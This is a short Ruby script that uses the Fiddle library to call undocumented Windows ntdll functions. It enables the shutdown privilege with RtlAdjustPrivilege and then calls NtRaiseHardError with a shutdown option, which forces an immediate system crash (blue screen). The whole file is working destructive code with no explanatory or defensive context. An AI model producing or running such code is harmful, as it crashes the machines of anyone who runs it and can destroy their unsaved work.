require 'fiddle'
require 'fiddle/import'

module NTDLL
  extend Fiddle::Importer
  dlload 'ntdll.dll'
  
  extern 'int RtlAdjustPrivilege(unsigned int, int, int, int*)'
  extern 'int NtRaiseHardError(unsigned int, unsigned int, unsigned int, void*, unsigned int, unsigned int*)'
end

enabled = Fiddle::Pointer.malloc(4)
response = Fiddle::Pointer.malloc(4)

NTDLL.RtlAdjustPrivilege(19, 1, 0, enabled)
NTDLL.NtRaiseHardError(0xC0000420, 0, 0, nil, 6, response)

